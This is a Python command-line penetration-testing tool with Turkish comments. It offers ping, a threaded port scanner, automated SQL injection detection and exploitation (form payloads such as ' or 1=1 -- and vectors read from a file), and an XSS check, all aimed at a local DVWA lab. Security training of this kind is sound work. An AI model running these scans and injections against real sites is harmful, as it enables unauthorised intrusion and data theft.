import logincontrol
import subprocess
import threading
import mechanize
import LogEditor
import platform
import argparse
import datetime
import difflib
import socket
import copy
import time
import sys
import os

from xss_vul import XssVulCheck
from login_utilty import input_check
from heapq import heappop, heappush
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

# from Threads import MyThread

class PenTool:

    def __init__(self):
        self.__Log = LogEditor.LogFile()
        self.open_ports = list()
        self.vulnerable_urls = list()
        self.login_process = logincontrol.LogInCheck()
        self.xss_vul = XssVulCheck()



    def ping(self, hostname):

        started_time = datetime.datetime.now().strftime("%H:%M:%S")
        parametre = "-n" if platform.system().lower() == "windows" else "-c"
        command = ["ping", parametre, "1", hostname]
        process_statu = None
        try:
            subprocess.check_output(command)
            process_statu = "Başarılı"
            ret = "{0} adresinden cevap alındı!".format(hostname)
        except:
            ret = "{0} adresinden cevap alınamadı.".format(hostname)
            process_statu = "Başarısız"
        finished_time = datetime.datetime.now().strftime("%H:%M:%S")  # İşlem burada bittiğinden dolayı bitiş
                                                                      # zamanını buraya yerleştirdik
        process_name = "Ping"
        date = datetime.datetime.now().strftime("%d/%m/%Y")
        details = "{0} adresine ping ataması gerçekleştirilmiştir.\n".format(hostname)\

        self.__Log.insert_to_log(process_name, process_statu, date, started_time, finished_time, details)
        return ret

    def partion_port_number(self, start_port, stop_port, thread_numbers):  # Bu method ile port sayılarını belirli thread
                                                                           # thread sayılarını ayırmaktayız fakat son thread
        total_port_numbers = stop_port - start_port                        # fazladan port sayısı alabilmektedir.
        thread_values_interval = list()  # Thread aralıklarının tutulacağı listedir.
        remainder = total_port_numbers % thread_numbers
        total_port_numbers = total_port_numbers - remainder
        interval = int(total_port_numbers / thread_numbers)  # Toplamda çalıştıracağımız thread sayısını belirlemektedir.
        thread_values_interval.append(start_port)  # Döngüye girilmeden önceki port başlangıç değerini belirlemektedir.

        for step in range(1, thread_numbers+1):
            if remainder != 0:
                start_port = start_port + interval + 1
                thread_values_interval.append(start_port)
                remainder = remainder - 1
            else:
                start_port = start_port + interval          #Threadlere verilecek aralıklarının hesaplanması
                thread_values_interval.append(start_port)   #Threadlere verilecek aralıkların listeye eklenmesidir.

        thread_values_interval[-1] = thread_values_interval[-1] + remainder
        # print(thread_values_interval, len(thread_values_interval), print("Remainder:", remainder))
        return thread_values_interval

    def port_scan_module(self, host, start_port, stop_port):

        # print(start_port, "-", stop_port)
        for port_number in range(start_port, stop_port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((host, port_number))
            if result == 0:
                self.open_ports.append(port_number)
                # print("Port {0} : Açık".format(port_number))
            sock.close()

    def port_scan(self, host=None, start_port=None, stop_port=None, thread_numbers=10):

        started_time = datetime.datetime.now().strftime("%H:%M:%S")
        threads_list = list()
        thread_values_interval = (self.partion_port_number(start_port, stop_port, thread_numbers))
        # print("Intervals: ", thread_values_interval)
        thread = None
        for thread_num in range(len(thread_values_interval) - 1):
            starting_port_interval = thread_values_interval[thread_num]     # Thread'e verilecek port başlangıcıdır.
            stopping_port_interval = thread_values_interval[thread_num + 1] #Her bir thread'e verilecek port sınırı.
            # print(starting_port_interval, stopping_port_interval)
            name_of_thread = "Thread_{0}".format(thread_num + 1) #Yeni oluşturulacak thread'in ismini belirler.
            # Alt tarafta bulunmakta olan satır dinamik olarak yeni bir thread üretmektedir.
            thread = threading.Thread(name=name_of_thread,
                                      target=self.port_scan_module,
                                      args=(host, starting_port_interval, stopping_port_interval))
            threads_list.append(thread) #Threadlerin listesini tutmaktadır.
            thread.start()

        threads_list_2 = threads_list
        while True:
            for thrd in threads_list:
                if not thrd.is_alive():
                    threads_list_2.remove(thrd)
            if len(threads_list_2) == 0:
                self.open_ports = self.heap_sort(self.open_ports)
                print(self.open_ports)
                break

        process_name = "Port Taraması"
        date = datetime.datetime.now().strftime("%d/%m/%Y")
        details = "{0} adresine port ataması gerçekleştirilmiştir.\n".format(host)

        if len(self.open_ports) == 0:
            process_statu = "Başarısız"
            details = details + "Fakat, açık herhangi bir port ile karşılaşılmamıştır."
            finished_time = datetime.datetime.now().strftime("%H:%M:%S")

        else:
            for port in self.open_ports:
                details = details + "-" + str(port) + "\n"
            process_statu = "Başarılı"
            finished_time = datetime.datetime.now().strftime("%H:%M:%S")

        self.__Log.insert_to_log(process_name, process_statu, date, started_time, finished_time, details)

    def heap_sort(self, array):
        heap = []
        for element in array:
            heappush(heap, element)
        ordered = []

        while heap:
            ordered.append(heappop(heap))

        return ordered

    def sql_injection_vul_check(self, host, browser):

        vulnerable_urls = list()
        browser.open(host)
        print("Checking :", browser.geturl())
        forms = browser.forms()
        print("SQL Injection Testi başlatılıyor...")
        for num_form, form in enumerate(forms):
            for control in form.controls:
                if control.type == "text":
                    browser.select_form(nr=num_form)  # Aldığım hatanın ana nedeni burasıdır.
                    browser.form[control.name] = "' or 1=1 --"  # SQL Injection zaafiyetini kontrol sözcüğüdür.
                    response = browser.submit()
                    response = response.read().decode("utf-8")
                    if "You have an error in your SQL syntax".lower() in response.lower():
                        print("{0} --> Url adresinde SQL Injection zaafiyeti vardır.".format(host))
                        print("---" * 32)
                        self.vulnerable_urls.append(host)
                        return True

    def find_nth_element(self, string, element, nth_element): # Url içerisinde bulmuş olduğumuz diğer tüm url adresleri
        counter = 0                                           # içersinde esas url'yi içermeyen url adreslerini
        for number in range(len(string)):                     # çıkarmak için kullanıyoruz.
            if string[number] == element:
                counter = counter + 1
            if counter == nth_element:
                return string[0:number]


    def sql_injection(self, host):

        vulnerable_urls = list()  # Zaafiyeti olan siteleri tutmak için oluşturulmuş bir listedir
        ret = self.login_process.login_check(host)
        browser = self.login_process.get_current_browser()
        if ret:
            browser = self.login_process.get_current_browser()
            print("{0} url adresi bir 'Giriş' sayfasıdır!\n"
                  "--Bu URL için SQL Injection atak denemesi yapmak istemiyorsanız giriş adımına yönlendirileceksiniz!--\n"
                  "SQL Injection denemesi yapılsın mı ? (e/h) -->  ".format(host), end="")
            control_input = input_check("e", "h")  # Kullanıcı tarafından onay alınması işlemidir.
            if control_input == "e":
                ret = self.sql_injection_vul_check(host, browser)
                if ret:
                    print("{0} url adresinde SQL Injection zaafiyet bulunmmaktadır.".format(host))
                    print("---"*32)
                else:
                    print("{0} url adresinde bir zaafiyet ile karşılaşılmadı.".format(host))
                    print("---"*32)
                    print("Giriş yapıldıktan sonra SQL Injection uygulansın mı ? (e / h) ", end="")
                    control_input = input_check("e", "h")
                    if control_input == "e":
                        current_url, browser = self.login_process.login_into_site()
                        print("Getting Url", browser.geturl())
                        login_browser = browser

                        print("Getting Url_' ", browser.geturl())
                        for link in browser.links():
                            if self.find_nth_element(host, "/", 3) in link.absolute_url\
                                     and "logout" not in link.absolute_url:
                                ret = self.sql_injection_vul_check(link.absolute_url, browser)
                                if ret:
                                    vulnerable_urls.append(link.absolute_url)
                        browser.open(current_url)
                        time.sleep(1)
                    else:
                        print("Çıkış yapılıyor...")
                        sys.exit()

            else:
                print("---" * 32)
                print("{0} adresi için giriş yapmak isiyor musunuz ? (e/h)".format(host), end="")
                control_input = input_check("e", "h")

                if control_input == "e":
                    current_url, browser = self.login_site(host)

                else:
                    print("İsteğiniz üzerine çıkış yapılıyor.")
                    sys.exit()

        else:
            print("Hedef : ", host)
            print("SQL Injection denemesi yapılsın mı ? (e/h) -->  ", end="")
            control_input = input_check("e", "h")  # Kullanıcı tarafından onay alınması
            if control_input == "e":
                browser.open(host)
                forms = browser.forms()
                for link in browser.links():
                    if self.find_nth_element(host, "/", 3) in link.absolute_url:
                        print(link.absolute_url)
                        if self.sql_injection_vul_check(link.absolute_url, browser):
                            vulnerable_urls.append(link.absolute_url)
                time.sleep(1)
                print("Vulnerable Urls : ", *vulnerable_urls)
            print("---" * 32)
        print(browser.geturl())
        return vulnerable_urls, browser

    def sql_exploit(self, link=None, browser=None):

        sql_symptom = list()
        try:
            with open("sqli_symptom.txt", "r") as symptoms:
                for symptom in symptoms:
                    sql_symptom.append(symptom)
        except FileNotFoundError as file_error:
            print("Lütfen SQL Symptom dosyasının doğru bir şekilde yüklendiğinden emin olunuz!")


        sql_vectors = list()
        try:
            with open("sqli_vector.txt", "r") as vectors:
                for line in vectors:
                    sql_vectors.append(line[:-1])
        except FileNotFoundError as file_error:
            print("Lütfen SQL Injection Vector dosyasının doğru bir şekilde yüklendiğinden emin olunuz!")

        response = browser.open(link)
        response_before_inj = response.read().decode('utf-8')
        forms = browser.forms()
        difference = ""
        for vector in sql_vectors:
            for num_form, form in enumerate(forms):
                for control in form.controls:
                    if control.type == "text":

                        browser.select_form(nr=num_form)  # Aldığım hatanın ana nedeni burasıdır.
                        browser.form[control.name] = vector  # SQL Injection zaafiyetini kontrol sözcüğüdür.
                        response = browser.submit()
                        response = response.read().decode("utf-8")
                        response_org = response
                        response = self.html_str_parser(response, "")
                        if response not in sql_symptom:
                            difference = [letter[2:] for letter in difflib.ndiff(response_before_inj, response_org) if letter[0] == '+']
                            difference = "".join(difference)
                            print(self.html_str_parser(difference, "\n"))
                        else:
                            browser.back()
        return self.html_str_parser(difference, "\n")

    def sql_perform(self):

        process_name = "Zafiyet Taraması"
        date = datetime.datetime.now().strftime("%d/%m/%Y")
        started_time = datetime.datetime.now().strftime("%H:%M:%S")
        vulnerable_urls, browser = self.sql_injection("http://192.168.56.101/dvwa/login.php")
        finished_time = datetime.datetime.now().strftime("%H:%M:%S")
        details = "Zaafiyet Taraması yapılmıştır. "
        process_statu = None
        if len(vulnerable_urls) > 0:
            process_statu = "Başarılı"
            for link in vulnerable_urls:
                details = details + "\n" +link
            details = details + "\n" + "Url adreslerinde zaafiyet bulunmuştur!"
        else:
            details = details + "\n" + "Zaafiyet bulunduran bir url adresi ile karşılaşılmamıştır!"
            process_statu = "Başarısız"

        self.__Log.insert_to_log(process_name, process_statu, date, started_time, finished_time, details)

        sql_exploit = ""
        process_name = "Zaafiyet Ortaya Çıkarma"
        process_statu = ""
        details = "Zafiyet ortaya çıkarma denemesi yapılmıştır. \n"
        started_time = datetime.datetime.now().strftime("%H:%M:%S")
        if len(vulnerable_urls) != 0:
            process_statu = "Başarılı"
            with open("sql_exploit.txt", "w+") as exploit_file:
                for link in vulnerable_urls:
                    sql_exploit = sql_exploit + test_tool.sql_exploit(link, browser)
                exploit_file.write(sql_exploit)
            exploit_file.close()
            details = details + "Zafiyet ortaya çıkarılmış ve sql_exploit.txt dosyasına kaydedilmiştir."
        else:
            process_statu = "Başarısız"
        finished_time = datetime.datetime.now().strftime("%H:%M:%S")
        self.__Log.insert_to_log(process_name, process_statu, date, started_time, finished_time, details)


    def html_str_parser(self, string, character):
        try:
            string = string.replace("<pre>", character)
            string = string.replace("</pre>", character)
            string = string.replace("<br>", character)
        except TypeError as error:
            print("String türünden bir karakter girmelisiniz!")

        return string

        # def xss_vul_scan(self, host, browser):
        #
        #     print("Checking :", browser.geturl())
        #     forms = browser.forms()
        #     ret, browser = self.login_check(host)
        #     if ret:
        #         print("{0} url adresi bir 'Giriş' sayfasıdır!\n"
        #               "--Bu URL için XSS zaafiyet taraması yapmak istemiyorsanız giriş adımına yönlendirileceksiniz!--\n"
        #               "XSS taraması yapılsın mı ? (e/h) -->  ".format(host), end="")
        #         control_input = self.input_check("e", "h")
        #         if control_input == "e":
        #             ret = self.xss_vul_check(host.)

    # def xss_vul_check(self, host, browser):
    #
    #     browser = webdriver.Firefox()
    #     browser.get(host)
    #     element = browser.find_element_by_id("passwd-id")
    #     print(element)

        # orj_response = browser.open(host).read().decode("utf-8")
        # print("Checking :", browser.geturl())
        # forms = browser.forms()
        # print("XSS Zaafiyet Taraması başlatılıyor...")
        # for num_form, form in enumerate(forms):
        #     for control in form.controls:
        #         if control.type == "text":
        #             browser.select_form(nr=num_form)  # Aldığım hatanın ana nedeni burasıdır.
        #             browser.form[control.name] = "<script>alert(123)</script>"  # SQL Injection zaafiyetini kontrol sözcüğüdür.
        #             response = browser.submit()
        #             print("Current url = ", browser.geturl())
        #             response = response.read().decode("utf-8")
        #             print(response)
        #             # print(type(orj_response), "---", type(response))
        #             # for letter in difflib.ndiff(orj_response, response):
        #                 # print(letter, end="")
        #             # print(response)
        #             # print(difflib.ndiff(orj_response, response))

    #
    # def xss_attack(self, host):
    #
    #     xss_vulnerable_urls = list()
    #

if __name__ == "__main__":
    #
    test_tool = PenTool()
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--ping", help= "Lütfen IP adresi veya domain adresi giriniz : ")
    parser.add_argument("-po", "--port", help= "Taranacak IP adresi veyahut domain adresini giriniz.")
    parser.add_argument("-ps", "--portbas",
                        help="Port taramasının başlanacağı değeri giriniz.",
                        type=str)

    parser.add_argument("-pf", "--portbit",
                        help="Port taramasının sona ereceği değeri giriniz.",
                        type=str)

    parser.add_argument("-t", "--thnum",
                        help="Port taramasını sırasında çalışacak thread sayısını giriniz.",
                        type=int)

    parser.add_argument("-sv", "--svul",
                        help= "Zafiyeti kontrol edilecek siteyi giriniz.")

    parser.add_argument("-se", "--sqlexp",
                        help= "SQL Injection için belirlenen adresi veriniz.")

    parser.add_argument("-xsv", "--xssvul",
                        help="Zafiyeti kontrol edilecek siteyi giriniz. ")

    args = parser.parse_args()

    if args.ping:
        started_time = datetime.datetime.now().strftime("%H:%M:%S")
        date = datetime.datetime.now().strftime("%d/%m/%Y")
        print("Belirtilen adrese ping ataması başlıyor!")
        time.sleep(1)
        print("-3")
        time.sleep(1)
        print("-2")
        time.sleep(1)
        print("-1")
        print("[ZAMAN-BİLGİ] KONSOL TARAFINDAN BAŞLANGIÇ ZAMANI : {0} - {1}".format(date, started_time))
        print("---"*35)
        run_time = time.time()
        print(test_tool.ping(args.ping))
        print("[ÇAL.ZAM] {0}s içerisinde tamamlandı!".format(str(time.time() - run_time)[0:4]))
        finish_time = datetime.datetime.now().strftime("%H:%M:%S")
        date = datetime.datetime.now().strftime("%d/%m/%Y")
        print("---" * 35)
        print("---" * 35)
        print("[ZAMAN-BİLGİ] KONSOL TARAFINDAN BİTİŞ ZAMANI : {0} - {1}".format(date, finish_time))

    elif args.port and args.portbas and args.portbit:
        try:
            args.portbas = int(args.portbas)
            args.portbit = int(args.portbit)
        except ValueError as orj_error_msj:
            print("Hata!")
            print(orj_error_msj)
            print("Port başlangıç ve bitiş numaralarını tamsayı türünden giriniz.")
            sys.exit()

        if args.portbas >= args.portbit:
            print("-----Port bitiş değeri, port başlangıç değerine eşit veya küçük olamaz!----- ")
            print("Çıkılıyor!!!")
            sys.exit()

        elif args.portbas > 65536 or args.portbit >= 65537:
            print("Port başlangıç veya port bitiş numaraları 65536 değerinden büyük olamaz!")
            print("Lütfen port başlangıç ve bitiş sayılarını 65536 veya küçük olacak şekilde giriniz.")
            sys.exit()

        elif args.portbit - args.portbas == 0:
            print("Port başlangıç ve port bitiş arasındaki fark 0 olamaz!!!")
            print("Lütfen Port başlangıç ve bitiş numaralarını aralrındaki fark 0 olacak şekilde tekrar giriniz.")
            sys.exit()

        else:
            total_num_port = str(args.portbit - args.portbas)
            thread_numbers = 10000
            if int(total_num_port) < 10000:
                if len(total_num_port) == 4:
                    thread_numbers = int(total_num_port[0]+"000")
                elif len(total_num_port) == 3:
                    thread_numbers = int(total_num_port[0]+"00")
                elif len(total_num_port) == 2:
                    thread_numbers = int(total_num_port[0]+"0")
                else:
                    thread_numbers = 1
            started_time = datetime.datetime.now().strftime("%H:%M:%S")
            date = datetime.datetime.now().strftime("%d/%m/%Y")
            print("Thread saysısı {0} olarak ayarlandı.".format(thread_numbers))

            print("Port taraması başlıyor...")
            print("3")
            time.sleep(1)
            print("2")
            time.sleep(1)
            print("1")
            print("[ZAMAN-BİLGİ] KONSOL BAŞLANGIÇ ZAMANI : {0} - {1}".format(date, started_time))
            run_time = time.time()
            test_tool.port_scan(host=args.port,
                                start_port=args.portbas,
                                stop_port=args.portbit,
                                thread_numbers=thread_numbers)
            print("[ÇAL.ZAM] {0}s içerisinde tamamlandı!".format(str(time.time() - run_time)[0:4]))
            finish_time = datetime.datetime.now().strftime("%H:%M:%S")
            date = datetime.datetime.now().strftime("%d/%m/%Y")
            print("[ZAMAN-BİLGİ] KONSOL BİTİŞ ZAMANI : {0} - {1}".format(date, finish_time))

    elif args.port and args.portbas and args.portbit and args.thnum:
        if args.portbas >= args.portbit:
            print("-----Port bitiş değeri, port başlangıç değerine eşit veya küçük olamaz!----- ")
            print("Çıkılıyor!!!")
            sys.exit()
        elif args.thnum > 0:
            started_time = datetime.datetime.now().strftime("%H:%M:%S")
            date = datetime.datetime.now().strftime("%d/%m/%Y")
            print("Thread sayısı {0} olarak ayarlandı!".format(args.thnum))
            time.sleep(0.3)
            print("Port taraması başlıyor...")
            time.sleep(1)
            print("3")
            time.sleep(1)
            print("2")
            time.sleep(1)
            print("1")
            print("[ZAMAN-BİLGİ] KONSOL BAŞLANGIÇ ZAMANI : {0} - {1}".format(date, started_time))
            run_time = time.time()
            test_tool.port_scan(host=args.port,
                                start_port=args.portbas,
                                stop_port=args.portbit,
                                thread_numbers=args.thnum)
            print("[ÇAL.ZAM] {0}s içerisinde tamamlandı!".format(str(time.time() - run_time)[0:4]))
            finish_time = datetime.datetime.now().strftime("%H:%M:%S")
            date = datetime.datetime.now().strftime("%d/%m/%Y")
            print("[ZAMAN-BİLGİ] KONSOL BİTİŞ ZAMANI : {0} - {1}".format(date, finish_time))
        else:
            print("----- Thread sayısı 0 veya daha küçük bir sayı olmamalıdır! -----")
            print("Çıkılıyor!!!")
            sys.exit()

    elif args.svul:

        started_time = datetime.datetime.now().strftime("%H:%M:%S")
        date = datetime.datetime.now().strftime("%d/%m/%Y")
        print("{0} adresi üzerine SQL zaafiyeti taraması başlatılıyor.".format(args.svul))
        print("3")
        time.sleep(1)
        print("2")
        time.sleep(1)
        print("1")
        print("[ZAMAN-BİLGİ] KONSOL BAŞLANGIÇ ZAMANI : {0} - {1}".format(date, started_time))
        run_time = time.time()
        vulnerable_urls, browser = test_tool.sql_injection(args.svul)
        print("[ÇAL.ZAM] {0}s içerisinde tamamlandı!".format(str(time.time() - run_time)[0:4]))
        finished_time = datetime.datetime.now().strftime("%H:%M:%S")
        print("[ZAMAN-BİLGİ] KONSOL BİTİŞ ZAMANI : {0} - {1}".format(date, finished_time))

    elif args.sqlexp:

        started_time = datetime.datetime.now().strftime("%H:%M:%S")
        date = datetime.datetime.now().strftime("%d/%m/%Y")
        print("{0} adresi üzerine SQL zafiyeti ortaya çıkarma başlatılıyor.".format(args.sqlexp))
        print("3")
        time.sleep(1)
        print("2")
        time.sleep(1)
        print("1")
        print("[ZAMAN-BİLGİ] KONSOL BAŞLANGIÇ ZAMANI : {0} - {1}".format(date, started_time))
        run_time = time.time()
        test_tool.sql_perform()
        print("[ÇAL.ZAM] {0}s içerisinde tamamlandı!".format(str(time.time() - run_time)[0:4]))
        finished_time = datetime.datetime.now().strftime("%H:%M:%S")
        print("[ZAMAN-BİLGİ] KONSOL BİTİŞ ZAMANI : {0} - {1}".format(date, finished_time))

    elif args.xssvul:
        # print(args.xssvul)
        started_time = datetime.datetime.now().strftime("%H:%M:%S")
        date = datetime.datetime.now().strftime("%d/%m/%Y")
        print("{0} adresi üzerinde XSS zaifiyeti ortaya çıkarma başlatılıyor.".format(args.xssvul))
        print("3")
        time.sleep(1)
        print("2")
        time.sleep(1)
        print("1")
        print("[ZAMAN-BİLGİ] KONSOL BAŞLANGIÇ ZAMANI : {0} - {1}".format(date, started_time))
        run_time = time.time()
        test_tool.xss_vul.start_xss(args.xssvul)
        print("[ÇAL.ZAM] {0}s içerisinde tamamlandı!".format(str(time.time() - run_time)[0:4]))
        finished_time = datetime.datetime.now().strftime("%H:%M:%S")
        print("[ZAMAN-BİLGİ] KONSOL BİTİŞ ZAMANI : {0} - {1}".format(date, finished_time))


        # started_time = datetime.datetime.now().strftime("%H:%M:%S")
        # date = datetime.datetime.now().strftime("%d/%m/%Y")
        # print("INFO", args.xssvul)

        # test_tool.xss_vul_check()

    # print(test_tool.ping("192.168.56.101"))
    # test_tool.port_scan(host="192.168.56.101", start_port=0, stop_port=30000, thread_numbers=10000)
    #test_tool.partion_port_number(0, 30000, 11)
    # vulnerable_urls, browser = test_tool.sql_injection("http://192.168.56.101/dvwa/login.php")
    # test_tool.sql_exploit(vulnerable_urls, browser)
    # test_tool.sql_perform()
    # test_tool.sql_injection_vul_check()
    #test_tool.sqli_vul_check("http://192.168.56.101/dvwa/vulnerabilities/sqli/")
    # print(test_tool.login_check("http://192.168.56.101/dvwa/vulnerabilities/sqli/"))
    # test_tool.get_links_from_page()